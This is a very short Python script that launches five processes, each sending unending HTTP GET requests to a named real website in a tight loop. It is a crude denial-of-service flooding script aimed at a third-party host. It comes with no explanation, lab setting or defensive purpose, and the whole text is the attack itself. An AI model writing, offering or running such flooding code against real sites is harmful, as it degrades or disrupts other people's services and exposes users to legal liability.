import multiprocessing
import requests

def flood():
  while True:
    requests.get('http://rule34.xxx')

for i in range(5):
  multiprocessing.Process(target=flood).start()
  
  
